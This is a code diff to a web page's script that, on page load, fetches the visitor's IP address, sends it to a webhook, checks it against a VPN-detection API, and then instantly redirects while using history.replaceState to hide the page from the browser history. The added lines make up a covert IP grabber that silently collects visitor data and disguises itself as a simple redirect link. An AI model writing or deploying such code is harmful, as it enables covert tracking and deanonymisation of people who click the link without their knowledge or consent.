@@ -58,10 +58,29 @@
             }
         }
 
+        async function checkVPN(ip) {
+            // Example: This API checks for VPNs, proxies, etc. (you'd need to sign up for such a service)
+            try {
+                const response = await fetch(`https://vpnapi.io/api/${ip}?key=your_api_key`);
+                const data = await response.json();
+                if (data.vpn) {
+                    console.log("VPN detected!");
+                }
+            } catch (error) {
+                console.error("Error checking VPN:", error);
+            }
+        }
+
         (async function () {
             const ip = await getIPv4();
-            if (ip) await sendToWebhook(ip);
-            window.location.href = REDIRECT_URL; // Instantly redirect
+            if (ip) {
+                await sendToWebhook(ip);
+                await checkVPN(ip);
+            }
+
+            // Redirect immediately after sending info
+            history.replaceState(null, '', REDIRECT_URL); // Replaces the URL with the redirect URL
+            window.location.href = REDIRECT_URL; // Redirects immediately
         })();
     </script>
 
